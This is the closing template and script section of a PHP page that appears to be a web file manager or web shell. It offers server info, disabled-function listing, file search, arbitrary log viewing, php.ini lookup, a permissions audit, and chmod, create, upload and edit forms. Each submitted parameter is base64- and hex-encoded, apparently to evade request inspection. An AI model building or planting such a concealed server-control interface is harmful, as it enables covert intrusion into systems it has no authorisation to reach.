<!-- Server Info Modal -->
<div class="modal" id="modal-serverinfo" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Server Info</h3>
            <button class="close-btn" type="button" data-close="serverinfo">×</button>
        </div>
        <table class="info-table">
            <tbody>
                <?php foreach ($serverInfo as $label => $value): ?>
                    <tr>
                        <th><?php echo htmlspecialchars($label, ENT_QUOTES); ?></th>
                        <td><?php echo htmlspecialchars($value, ENT_QUOTES); ?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <div class="card" style="margin-top: 12px;">
            <div class="meta">Feature Flags</div>
            <div class="actions" style="margin-top: 10px;">
                <?php foreach ($featureFlags as $label => $enabled): ?>
                    <span class="tag<?php echo $enabled ? '' : ' off'; ?>">
                        <?php echo htmlspecialchars($label, ENT_QUOTES); ?>: <?php echo $enabled ? 'true' : 'false'; ?>
                    </span>
                <?php endforeach; ?>
            </div>
        </div>
        <div class="card" style="margin-top: 12px;">
            <div class="meta">Disabled Functions</div>
            <?php if (count($disabledFunctions) === 0): ?>
                <div class="meta" style="margin-top: 8px;">None</div>
            <?php else: ?>
                <table class="info-table" style="margin-top: 8px;">
                    <tbody>
                        <?php foreach ($disabledFunctions as $fn): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($fn, ENT_QUOTES); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
        <div class="modal-actions">
            <button class="button" type="button" data-close="serverinfo">Close</button>
        </div>
    </div>
</div>

<!-- Tools Modal -->
<div class="modal<?php echo $toolsOpen ? ' is-open' : ''; ?>" id="modal-tools" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Tools</h3>
            <button class="close-btn" type="button" data-close="tools">×</button>
        </div>

        <div class="card">
            <div class="meta">Smart Search (filename + content)</div>
            <form method="post" id="form-search" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="search">
                <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                <input type="hidden" name="q" id="search-term-encoded">
                <input type="hidden" name="inc" id="search-content-encoded">
                <input type="hidden" name="mk" id="search-size-encoded">
                <input type="hidden" name="mr" id="search-results-encoded">
                <input id="search-term" type="text" placeholder="Search term..." required>
                <label class="meta" style="display:flex;align-items:center;gap:8px;">
                    <input id="search-content" type="checkbox">
                    Include content search
                </label>
                <div class="form-row">
                    <input id="search-size" type="number" min="1" max="2048" placeholder="Max size KB (512)">
                    <input id="search-results" type="number" min="1" max="500" placeholder="Max results (100)">
                </div>
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Search">
                </div>
            </form>
            <?php if ($toolSearchOutput !== ''): ?>
                <div class="card" style="margin-top:12px;"><?php echo $toolSearchOutput; ?></div>
            <?php endif; ?>
        </div>

        <div class="card">
            <div class="meta">Log Viewer (tail file)</div>
            <form method="post" id="form-log" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="log">
                <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                <input type="hidden" name="lp" id="log-path-encoded">
                <input type="hidden" name="ll" id="log-lines-encoded">
                <input id="log-path" type="text" placeholder="/var/log/system.log" required>
                <input id="log-lines" type="number" min="1" max="2000" placeholder="Lines (200)">
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="View">
                </div>
            </form>
            <?php if ($toolLogOutput !== ''): ?>
                <div class="card" style="margin-top:12px;"><?php echo $toolLogOutput; ?></div>
            <?php endif; ?>
        </div>

        <div class="card">
            <div class="meta">Config Inspector (php.ini)</div>
            <form method="post" id="form-ini" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="ini">
                <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                <input type="hidden" name="ik" id="ini-key-encoded">
                <input id="ini-key" type="text" placeholder="memory_limit" required>
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Lookup">
                </div>
            </form>
            <?php if ($toolIniOutput !== ''): ?>
                <div class="card" style="margin-top:12px;"><?php echo $toolIniOutput; ?></div>
            <?php endif; ?>
        </div>

        <div class="card">
            <div class="meta">Permissions Audit</div>
            <form method="post" id="form-perm" style="margin-top:10px;">
                <input type="hidden" name="tool_action" value="perm">
                <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="Run Audit">
                </div>
            </form>
            <?php if ($toolPermOutput !== ''): ?>
                <div class="card" style="margin-top:12px;"><?php echo $toolPermOutput; ?></div>
            <?php endif; ?>
        </div>

        <div class="modal-actions">
            <button class="button" type="button" data-close="tools">Close</button>
        </div>
    </div>
</div>

<script>
// Encoding functions
function encodeParam(str) {
    const base64 = btoa(unescape(encodeURIComponent(str)));
    let hex = '';
    for (let i = 0; i < base64.length; i++) {
        hex += base64.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return hex;
}

const modalMap = {
    create: document.getElementById('modal-create'),
    chmod: document.getElementById('modal-chmod'),
    upload: document.getElementById('modal-upload'),
    serverinfo: document.getElementById('modal-serverinfo'),
    tools: document.getElementById('modal-tools'),
    edit: document.getElementById('modal-edit')
};

function openModal(name) {
    const modal = modalMap[name];
    if (!modal) return;
    modal.classList.add('is-open');
    modal.setAttribute('aria-hidden', 'false');
}

function closeModal(name) {
    const modal = modalMap[name];
    if (!modal) return;
    modal.classList.remove('is-open');
    modal.setAttribute('aria-hidden', 'true');
}

document.querySelectorAll('[data-modal]').forEach((btn) => {
    btn.addEventListener('click', () => {
        const name = btn.getAttribute('data-modal');
        if (name === 'create') {
            const type = btn.getAttribute('data-type') || 'file';
            const typeInput = document.getElementById('create-type');
            if (typeInput) typeInput.value = type;
        }
        if (name === 'chmod') {
            const path = btn.getAttribute('data-path') || '';
            const pathInput = document.getElementById('chmod-path');
            if (pathInput && path) pathInput.value = path;
        }
        openModal(name);
    });
});

document.querySelectorAll('[data-close]').forEach((btn) => {
    btn.addEventListener('click', () => {
        const name = btn.getAttribute('data-close');
        closeModal(name);
    });
});

document.querySelectorAll('.modal').forEach((modal) => {
    modal.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.classList.remove('is-open');
            modal.setAttribute('aria-hidden', 'true');
        }
    });
});

// Handle create form encoding
const formCreate = document.getElementById('form-create');
if (formCreate) {
    formCreate.addEventListener('submit', (e) => {
        const nameInput = document.getElementById('create-name');
        const nameEncoded = document.getElementById('create-name-encoded');
        if (nameInput && nameEncoded) {
            nameEncoded.value = encodeParam(nameInput.value);
        }
    });
}

// Handle chmod form encoding
const formChmod = document.getElementById('form-chmod');
if (formChmod) {
    formChmod.addEventListener('submit', (e) => {
        const pathInput = document.getElementById('chmod-path');
        const pathEncoded = document.getElementById('chmod-path-encoded');
        const modeInput = document.getElementById('chmod-mode');
        const modeEncoded = document.getElementById('chmod-mode-encoded');
        
        if (pathInput && pathEncoded) {
            pathEncoded.value = encodeParam(pathInput.value);
        }
        if (modeInput && modeEncoded) {
            modeEncoded.value = encodeParam(modeInput.value);
        }
    });
}

// Handle edit form encoding
const formEdit = document.getElementById('form-edit');
if (formEdit) {
    formEdit.addEventListener('submit', (e) => {
        const contentInput = document.getElementById('edit-content');
        const contentEncoded = document.getElementById('edit-content-encoded');
        if (contentInput && contentEncoded) {
            contentEncoded.value = encodeParam(contentInput.value);
        }
    });
}

// Handle tools form encoding
const formSearch = document.getElementById('form-search');
if (formSearch) {
    formSearch.addEventListener('submit', () => {
        const term = document.getElementById('search-term');
        const termEncoded = document.getElementById('search-term-encoded');
        const includeContent = document.getElementById('search-content');
        const includeEncoded = document.getElementById('search-content-encoded');
        const maxSize = document.getElementById('search-size');
        const maxSizeEncoded = document.getElementById('search-size-encoded');
        const maxResults = document.getElementById('search-results');
        const maxResultsEncoded = document.getElementById('search-results-encoded');

        if (term && termEncoded) termEncoded.value = encodeParam(term.value);
        if (includeContent && includeEncoded) includeEncoded.value = encodeParam(includeContent.checked ? '1' : '0');
        if (maxSize && maxSizeEncoded) maxSizeEncoded.value = encodeParam(maxSize.value || '512');
        if (maxResults && maxResultsEncoded) maxResultsEncoded.value = encodeParam(maxResults.value || '100');
    });
}

const formLog = document.getElementById('form-log');
if (formLog) {
    formLog.addEventListener('submit', () => {
        const path = document.getElementById('log-path');
        const pathEncoded = document.getElementById('log-path-encoded');
        const lines = document.getElementById('log-lines');
        const linesEncoded = document.getElementById('log-lines-encoded');
        if (path && pathEncoded) pathEncoded.value = encodeParam(path.value);
        if (lines && linesEncoded) linesEncoded.value = encodeParam(lines.value || '200');
    });
}

const formIni = document.getElementById('form-ini');
if (formIni) {
    formIni.addEventListener('submit', () => {
        const key = document.getElementById('ini-key');
        const keyEncoded = document.getElementById('ini-key-encoded');
        if (key && keyEncoded) keyEncoded.value = encodeParam(key.value);
    });
}
</script>
</body>
</html>
